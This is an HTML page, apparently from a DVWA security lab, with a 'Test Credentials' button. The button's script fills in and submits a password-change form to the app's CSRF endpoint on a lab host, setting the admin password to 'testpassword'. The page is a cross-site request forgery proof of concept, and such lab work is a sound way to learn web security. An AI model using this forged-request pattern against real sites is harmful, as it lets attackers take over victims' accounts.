<html lang="en-GB">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Damn Vulnerable Web Application (DVWA) Test Credentials</title>
    <link rel="stylesheet" type="text/css" href="../../dvwa/css/source.css">
    <link rel="icon" type="image/ico" href="../../favicon.ico">
</head>
<body>
    <div id="container">
        <div class="vulnerable_code_area">
            <h3>Change your admin password:</h3><br>
            <div id="test_credentials">
                <button onclick="testFunct()">Test Credentials</button><br><br>
                <script>
                    function testFunct() {
                        // Set password fields with test data
                        document.querySelector('input[name="password_new"]').value = "testpassword";
                        document.querySelector('input[name="password_conf"]').value = "testpassword";
                        
                        // Submit the form
                        document.getElementById("changePasswordForm").submit();
                    }
                </script>
            </div><br>
            <form id="changePasswordForm" action="https://lab-2105cf46-fd70-4e4b-8ece-4494323c5240.australiaeast.cloudapp.azure.com:7042/DVWA/vulnerabilities/csrf/source/low.php" method="GET">
                New password:<br>
                <input type="password" autocomplete="off" name="password_new"><br>
                Confirm new password:<br>
                <input type="password" autocomplete="off" name="password_conf"><br><br>
                <input type="submit" value="Change" name="Change">
            </form>
            <pre>Password Changed.</pre>
        </div>
    </div>
</body>
</html>
